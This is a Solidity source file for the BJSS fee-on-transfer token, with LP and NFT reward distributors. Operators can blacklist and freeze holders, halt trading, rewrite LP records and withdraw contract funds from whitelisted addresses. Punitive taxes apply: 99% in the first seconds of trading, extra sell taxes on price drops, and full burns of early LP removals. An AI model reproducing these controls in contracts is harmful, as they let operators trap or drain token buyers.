// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC721 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);

    function feeTo() external view returns (address);
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Math {
    function min(uint x, uint y) internal pure returns (uint z) {
        z = x < y ? x : y;
    }

    function sqrt(uint y) internal pure returns (uint z) {
        if (y > 3) {
            z = y;
            uint x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract NFTRewards {
    address public owner;
    address public dev;
    address public token;
    address public nft;
    uint256 public holderRewardCondition;

    constructor(
        address _dev,
        address _token,
        address _nft,
        uint256 _holderRewardCondition
    ) {
        owner = msg.sender;
        dev = _dev;
        token = _token;
        nft = _nft;
        holderRewardCondition = _holderRewardCondition;
        excludeHolder[dev] = true;
        excludeHolder[address(0x0)] = true;
        excludeHolder[address(0xdead)] = true;
        excludeHolder[0xC0dc349c988bb1Df33fa4AAB17397D232E3580F2] = true;
    }

    modifier onlyDev() {
        require(msg.sender == dev, "not dev");
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    uint256 public currentIndex;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 0;
    mapping(address => bool) public excludeHolder;

    function setExcludeHolder(address _ex, bool status) public onlyDev {
        excludeHolder[_ex] = status;
    }

    function setHolderRewardCondition(
        uint256 _holderRewardCondition
    ) public onlyDev {
        holderRewardCondition = _holderRewardCondition;
    }

    function claimBalance(address to, uint256 amount) external onlyDev {
        payable(to).transfer(amount);
    }

    function claimToken(
        address _token,
        address to,
        uint256 amount
    ) external onlyDev {
        IERC20(_token).transfer(to, amount);
    }

    function processReward(uint256 gas) external onlyOwner {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC721 holdToken = IERC721(nft);
        uint256 holdTokenTotal = holdToken.totalSupply();
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 amount;
        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < holdTokenTotal) {
            if (currentIndex >= holdTokenTotal) {
                currentIndex = 0;
            }
            shareHolder = IERC721(nft).ownerOf(currentIndex);
            if (!excludeHolder[shareHolder]) {
                amount = balance / holdTokenTotal;
                if (amount > 0) {
                    IERC20(token).transfer(shareHolder, amount);
                }
            }
            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
        progressRewardBlock = blockNum;
    }
}

contract LPRewards {
    address public constant pinkLockAddress =
        0x407993575c91ce7643a4d4cCACc9A98c36eE1BBE;

    address public dev;
    address public owner;
    address public token;
    address public lpToken;
    uint256 public holderRewardCondition;

    constructor(
        address _owner,
        address _token,
        address _lpToken,
        uint256 _holderRewardCondition
    ) {
        dev = _owner;
        owner = msg.sender;
        token = _token;
        lpToken = _lpToken;
        holderRewardCondition = _holderRewardCondition;
        excludeHolder[address(0x0)] = true;
        excludeHolder[address(0xdead)] = true;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier onlyDev() {
        require(msg.sender == dev, "not dev");
        _;
    }

    address[] public holders;
    mapping(address => uint256) public holderIndex;
    mapping(address => bool) public excludeHolder;

    function getHolderLength() public view returns (uint256) {
        return holders.length;
    }

    function addHolder(address adr) external onlyOwner {
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                uint256 size;
                assembly {
                    size := extcodesize(adr)
                }
                if (size > 0) {
                    return;
                }
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 public currentIndex;
    uint256 public holderCondition = 1;
    uint256 public progressRewardBlock;
    uint256 public progressRewardBlockDebt = 0;

    function processReward(uint256 gas) external onlyOwner {
        uint256 blockNum = block.number;
        if (progressRewardBlock + progressRewardBlockDebt > blockNum) {
            return;
        }

        IERC20 usdt = IERC20(token);

        uint256 balance = usdt.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }
        balance = holderRewardCondition;

        IERC20 holdToken = IERC20(lpToken);
        uint holdTokenTotal = holdToken.totalSupply() -
            holdToken.balanceOf(pinkLockAddress);
        if (holdTokenTotal == 0) {
            return;
        }

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();
        uint256 holdCondition = holderCondition;

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance >= holdCondition && !excludeHolder[shareHolder]) {
                amount = (balance * tokenBalance) / holdTokenTotal;
                if (amount > 0) {
                    usdt.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = blockNum;
    }

    function setHolderRewardCondition(uint256 amount) external onlyDev {
        holderRewardCondition = amount;
    }

    function setHolderCondition(uint256 amount) external onlyDev {
        holderCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyDev {
        excludeHolder[addr] = enable;
    }

    function setProgressRewardBlockDebt(uint256 blockDebt) external onlyDev {
        progressRewardBlockDebt = blockDebt;
    }

    function claimBalance(address to, uint256 amount) external onlyDev {
        payable(to).transfer(amount);
    }

    function claimToken(
        address _token,
        address to,
        uint256 amount
    ) external onlyDev {
        IERC20(_token).transfer(to, amount);
    }
}

abstract contract AbsToken is IERC20, Ownable {
    struct UserInfo {
        uint256 lpAmount;
        bool preLP;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public nftAddress;
    address public fundAddress;
    address public fund2Address;
    address public nodeRewardsAddress;

    uint256 public lpTotalFees;
    uint256 public fundTotalFees;
    uint256 public fund2TotalFees;
    uint256 public nftTotalFees;
    uint256 public nodeTotalFees;

    uint256 public buyLpFee = 8;
    uint256 public buyFundFee = 9;
    uint256 public buyFund2Fee = 12;
    uint256 public buyNftFee = 5;
    uint256 public buyNodeFee = 5;

    uint256 public sellBurnFee = 15;
    uint256 public sellLpFee = 13;
    uint256 public sellFundFee = 29;
    uint256 public sellFund2Fee = 17;
    uint256 public sellNftFee = 5;
    uint256 public sellNodeFee = 10;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) private _feeWhiteList;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _baseToken;
    address private _rewardToken;
    mapping(address => bool) private _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    NFTRewards public nftRewards;
    LPRewards public lpRewards;

    address public _destroyAddress = address(0xdead);
    uint256 public startTradeTimestamp;
    address public _mainPair;

    uint256 public priceAtEight;
    uint256 public lastCheckPriceTimestamp;
    uint256 public dayTS = 1 days;
    uint256 public swapTokenAtAmount;
    mapping(address => UserInfo) private _userInfo;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    modifier onlyFunder() {
        require(
            fundAddress == msg.sender || _owner == msg.sender,
            "!fundAddress"
        );
        _;
    }

    constructor(
        address RouterAddress,
        address BaseToken,
        address RewardToken,
        address NFTAddress,
        address NodeAddress,
        address FundAddress,
        address Fund2Address,
        address ReceiveAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply
    ) {
        require(BaseToken < address(this), "try again");
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        nftAddress = NFTAddress;
        nodeRewardsAddress = NodeAddress;
        _rewardToken = RewardToken;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);

        _baseToken = BaseToken;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        IERC20(BaseToken).approve(RouterAddress, MAX);

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _mainPair = swapFactory.createPair(address(this), BaseToken);
        _swapPairList[_mainPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;
        fund2Address = Fund2Address;
        _feeWhiteList[nodeRewardsAddress] = true;
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[Fund2Address] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[_destroyAddress] = true;

        startTradeTimestamp = total;
        lastCheckPriceTimestamp = total;

        nftRewards = new NFTRewards(
            msg.sender,
            RewardToken,
            nftAddress,
            0.1 ether
        );
        lpRewards = new LPRewards(
            msg.sender,
            RewardToken,
            _mainPair,
            0.1 ether
        );
        swapTokenAtAmount = total / 100000;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(
            (!_blackList[from] && !_blackList[to]) || _feeWhiteList[from],
            "blackList"
        );

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (block.timestamp >= lastCheckPriceTimestamp + dayTS) {
            lastCheckPriceTimestamp += dayTS;
            priceAtEight = getCurrentPrice();
        }

        bool takeFee;
        bool isAddLP;
        bool isRemoveLP;
        UserInfo storage userInfo;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            if (balance == amount) {
                amount = amount - 0.00001 ether;
            }
        }

        uint256 addLPLiquidity;
        if (to == _mainPair && address(_swapRouter) == msg.sender) {
            addLPLiquidity = _isAddLiquidity(amount);
            if (addLPLiquidity > 0) {
                userInfo = _userInfo[from];
                userInfo.lpAmount += addLPLiquidity;
                isAddLP = true;
                if (block.timestamp <= startTradeTimestamp) {
                    userInfo.preLP = true;
                }
            }
        }

        uint256 removeLPLiquidity;
        if (from == _mainPair) {
            removeLPLiquidity = _strictCheckBuy(amount);
            if (removeLPLiquidity > 0) {
                if (block.timestamp <= startTradeTimestamp + 7 days) {
                    require(_userInfo[to].lpAmount >= removeLPLiquidity);
                    _userInfo[to].lpAmount -= removeLPLiquidity;
                }
                isRemoveLP = true;
            }
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;
                if (isAddLP) {
                    takeFee = false;
                }

                if (block.timestamp <= startTradeTimestamp) {
                    require(isAddLP, "!Trade");
                } else {
                    if (block.timestamp < startTradeTimestamp + 15) {
                        _funTransfer(from, to, amount);
                        return;
                    }
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isRemoveLP);

        if (from != address(this)) {
            if (isAddLP) {
                lpRewards.addHolder(from);
            }
            if (_swapPairList[from] && _userInfo[to].preLP) {
                lpRewards.addHolder(to);
            }
            if (takeFee) {
                lpRewards.processReward(250000);
                nftRewards.processReward(250000);
            }
        }
    }

    function _isAddLiquidity(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        uint256 amountOther;
        if (rOther > 0 && rThis > 0) {
            amountOther = (amount * rOther) / rThis;
        }
        //isAddLP
        if (balanceOther >= rOther + amountOther) {
            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);
        }
    }

    function _strictCheckBuy(
        uint256 amount
    ) internal view returns (uint256 liquidity) {
        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();
        //isRemoveLP
        if (balanceOther < rOther) {
            liquidity =
                (amount * ISwapPair(_mainPair).totalSupply()) /
                (_balances[_mainPair] - amount);
        } else {
            uint256 amountOther;
            if (rOther > 0 && rThis > 0) {
                amountOther = (amount * rOther) / (rThis - amount);
                //strictCheckBuy
                require(balanceOther >= amountOther + rOther);
            }
        }
    }

    function calLiquidity(
        uint256 balanceA,
        uint256 amount,
        uint256 r0,
        uint256 r1
    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {
        uint256 pairTotalSupply = ISwapPair(_mainPair).totalSupply();
        address feeTo = ISwapFactory(_swapRouter.factory()).feeTo();
        bool feeOn = feeTo != address(0);
        uint256 _kLast = ISwapPair(_mainPair).kLast();
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = Math.sqrt(r0 * r1);
                uint256 rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = pairTotalSupply *
                        (rootK - rootKLast) *
                        8;
                    uint256 denominator = rootK * 17 + (rootKLast * 8);
                    feeToLiquidity = numerator / denominator;
                    if (feeToLiquidity > 0) pairTotalSupply += feeToLiquidity;
                }
            }
        }
        uint256 amount0 = balanceA - r0;
        if (pairTotalSupply == 0) {
            liquidity = Math.sqrt(amount0 * amount) - 1000;
        } else {
            liquidity = Math.min(
                (amount0 * pairTotalSupply) / r0,
                (amount * pairTotalSupply) / r1
            );
        }
    }

    function _getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis, uint256 balanceOther)
    {
        (rOther, rThis) = __getReserves();
        balanceOther = IERC20(_baseToken).balanceOf(_mainPair);
    }

    function __getReserves()
        public
        view
        returns (uint256 rOther, uint256 rThis)
    {
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0, uint256 r1, ) = mainPair.getReserves();

        address tokenOther = _baseToken;
        if (tokenOther < address(this)) {
            rOther = r0;
            rThis = r1;
        } else {
            rOther = r1;
            rThis = r0;
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(sender, address(this), feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isRemoveLP
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        uint256 destoryAmount;

        if (takeFee) {
            if (isRemoveLP) {
                if (
                    _userInfo[recipient].preLP &&
                    block.timestamp <= startTradeTimestamp + 7 days
                ) {
                    destoryAmount = tAmount;
                } else {
                    destoryAmount = (sellBurnFee * tAmount) / 1000;
                    uint256 sellFundFees = (sellFundFee * tAmount) / 1000;
                    uint256 sellLpFees = (sellLpFee * tAmount) / 1000;
                    uint256 sellNftFees = (sellNftFee * tAmount) / 1000;
                    uint256 sellNodeFees = (sellNodeFee * tAmount) / 1000;
                    uint256 sellFund2Fees = (sellFund2Fee * tAmount) / 1000;

                    feeAmount =
                        sellLpFees +
                        sellFundFees +
                        sellNftFees +
                        sellNodeFees +
                        sellFund2Fees;

                    lpTotalFees += sellLpFees;
                    fundTotalFees += sellFundFees;
                    nftTotalFees += sellNftFees;
                    nodeTotalFees += sellNodeFees;
                    fund2TotalFees += sellFund2Fees;
                }
            } else if (_swapPairList[sender]) {
                uint256 buyLpFees = (buyLpFee * tAmount) / 1000;
                uint256 buyFundFees = (buyFundFee * tAmount) / 1000;
                uint256 buyNftFees = (buyNftFee * tAmount) / 1000;
                uint256 buyNodeFees = (buyNodeFee * tAmount) / 1000;
                uint256 buyFund2Fees = (buyFund2Fee * tAmount) / 1000;

                feeAmount =
                    buyLpFees +
                    buyFundFees +
                    buyNftFees +
                    buyNodeFees +
                    buyFund2Fees;

                lpTotalFees += buyLpFees;
                fundTotalFees += buyFundFees;
                fund2TotalFees += buyFund2Fees;
                nftTotalFees += buyNftFees;
                nodeTotalFees += buyNodeFees;
            } else if (_swapPairList[recipient]) {
                if (!inSwap) {
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance >= swapTokenAtAmount) {
                        swapTokenForFund(contractTokenBalance);
                        lpTotalFees = 0;
                        fundTotalFees = 0;
                        nftTotalFees = 0;
                        nodeTotalFees = 0;
                        fund2TotalFees = 0;
                    }
                }
                uint256 sellFundFees = (sellFundFee * tAmount) / 1000;
                if (block.timestamp <= startTradeTimestamp + 5 minutes) {
                    sellFundFees += (261 * tAmount) / 1000;
                }

                if (
                    block.timestamp > startTradeTimestamp + 5 minutes &&
                    block.timestamp <= startTradeTimestamp + 30 minutes
                ) {
                    sellFundFees += (161 * tAmount) / 1000;
                }

                if (
                    block.timestamp > startTradeTimestamp + 600 &&
                    priceAtEight > 0
                ) {
                    // 检查价格跌幅，是否超过
                    uint256 currentPrice = getCurrentPrice();
                    if (currentPrice <= (priceAtEight * 80) / 100) {
                        sellFundFees += (211 * tAmount) / 1000;
                    } else if (currentPrice <= (priceAtEight * 88) / 100) {
                        sellFundFees += (61 * tAmount) / 1000;
                    }
                }

                destoryAmount = (sellBurnFee * tAmount) / 1000;
                uint256 sellLpFees = (sellLpFee * tAmount) / 1000;
                uint256 sellNftFees = (sellNftFee * tAmount) / 1000;
                uint256 sellNodeFees = (sellNodeFee * tAmount) / 1000;
                uint256 sellFund2Fees = (sellFund2Fee * tAmount) / 1000;

                feeAmount =
                    sellLpFees +
                    sellFundFees +
                    sellNftFees +
                    sellNodeFees +
                    sellFund2Fees;

                lpTotalFees += sellLpFees;
                fundTotalFees += sellFundFees;
                nftTotalFees += sellNftFees;
                nodeTotalFees += sellNodeFees;
                fund2TotalFees += sellFund2Fees;
            }
        }

        if (destoryAmount > 0) {
            _takeTransfer(sender, address(0xdead), destoryAmount);
        }

        if (feeAmount > 0) {
            _takeTransfer(sender, address(this), feeAmount);
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount - destoryAmount);
    }

    function getCurrentPrice() public view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _baseToken;
        return _swapRouter.getAmountsOut(1 ether, path)[1];
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        uint256 totalFees = lpTotalFees +
            fundTotalFees +
            nftTotalFees +
            nodeTotalFees +
            fund2TotalFees;

        totalFees = totalFees >= tokenAmount ? totalFees : tokenAmount;
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = _baseToken;
        path[2] = _rewardToken;
        _approve(address(this), address(_swapRouter), tokenAmount);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        IERC20 rewardToken = IERC20(_rewardToken);
        uint256 usdtBalance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(
            address(lpRewards),
            (lpTotalFees * usdtBalance) / totalFees
        );

        rewardToken.transfer(
            address(nftRewards),
            (nftTotalFees * usdtBalance) / totalFees
        );

        rewardToken.transfer(
            nodeRewardsAddress,
            (nodeTotalFees * usdtBalance) / totalFees
        );

        rewardToken.transfer(
            fund2Address,
            (fund2TotalFees * usdtBalance) / totalFees
        );

        rewardToken.transfer(fundAddress, rewardToken.balanceOf(address(this)));
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setSwapTokenAtAmount(
        uint256 _swapTokenAtAmount
    ) public onlyFunder {
        swapTokenAtAmount = _swapTokenAtAmount;
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function batchSetFeeWhiteList(
        address[] memory addr,
        bool enable
    ) external onlyFunder {
        for (uint i = 0; i < addr.length; i++) {
            _feeWhiteList[addr[i]] = enable;
        }
    }

    function batchSetBlackList(
        address[] memory addr,
        bool enable
    ) external onlyFunder {
        for (uint i = 0; i < addr.length; i++) {
            _blackList[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            payable(to).transfer(amount);
        }
    }

    function claimToken(address token, address to, uint256 amount) external {
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(to, amount);
        }
    }

    receive() external payable {}

    function startTrade(uint256 _lastCheckPriceBlock) external onlyOwner {
        lastCheckPriceTimestamp = _lastCheckPriceBlock;
        startTradeTimestamp = block.timestamp;
    }

    function setStartTradeTimestamp(
        uint256 _startTradeTimestamp,
        uint256 _lastCheckPriceBlock
    ) external onlyOwner {
        lastCheckPriceTimestamp = _lastCheckPriceBlock;
        startTradeTimestamp = _startTradeTimestamp;
    }

    function stopTrade() external onlyOwner {
        startTradeTimestamp = _tTotal;
    }

    function setDayTS(uint256 _dayTS) external onlyOwner {
        dayTS = _dayTS;
    }

    function updateLPAmount(
        address account,
        uint256 lpAmount
    ) public onlyFunder {
        _userInfo[account].lpAmount = lpAmount;
    }

    function getUserInfo(
        address account
    ) public view returns (uint256 lpAmount, uint256 lpBalance, bool preLP) {
        lpAmount = _userInfo[account].lpAmount;
        lpBalance = IERC20(_mainPair).balanceOf(account);
        UserInfo storage userInfo = _userInfo[account];
        preLP = userInfo.preLP;
    }

    function initLPAmounts(
        address[] memory accounts,
        uint256 lpAmounts
    ) public onlyFunder {
        uint256 len = accounts.length;
        UserInfo storage userInfo;
        for (uint256 i; i < len; ) {
            userInfo = _userInfo[accounts[i]];
            userInfo.lpAmount = lpAmounts;
            userInfo.preLP = true;
            unchecked {
                ++i;
            }
        }
    }
}

contract BJSS is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),
            address(0x55d398326f99059fF775485246999027B3197955),
            address(0xd105612d3909ADcDEC23a5d75e0D44F413F5ca24),
            address(0xA878d7Fc0075aDCE089a89818b2A97c5810680cb),
            address(0x57E2A87ffd31a42eFd2C3c828aBED49486777400),
            address(0x70455ee01b103D42C9A66C496CfDaf363d4C03C7),
            address(0xE9B42Ad9e4DDFeabbB1bDFeab0216BeB047D012d),
            "BJSS",
            "BJSS",
            18,
            2000000000
        )
    {}
}